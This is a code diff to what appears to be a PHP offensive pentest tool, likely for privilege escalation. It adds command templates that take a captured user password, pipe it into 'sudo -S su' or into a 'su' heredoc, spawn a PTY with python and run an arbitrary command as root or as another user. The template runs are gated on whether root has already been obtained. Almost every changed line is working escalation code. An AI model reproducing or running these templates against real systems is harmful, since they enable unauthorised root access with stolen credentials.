@@ -705,8 +705,12 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         
         $template_id_euid = "sudo bash -c '%ID%' ";
         if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "export TERM=xterm ; sudo su -c '%ID%' ";
+        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "sudo su -c '%ID%' ";
         if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
+        
+        
     }
     
     
@@ -787,9 +791,14 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
         $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "export TERM=xterm; echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
+        $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
         $this->pentest8id($stream,$template_id_euid);
-
+        $template_id_euid = "echo -e \"python -c 'import pty; pty.spawn(\"$shell\")'; export TERM=xterm; su - $user_name <<! >/dev/null 2>&1\n$user_pass\n%ID% > /dev/tty\nls > /dev/tty\n!\" | bash";
+        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "echo -e \"su - $user_name <<! >/dev/null 2>&1\n$user_pass\n%ID% > /dev/tty\nls > /dev/tty\n!\" | bash";
+        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
         
         
 
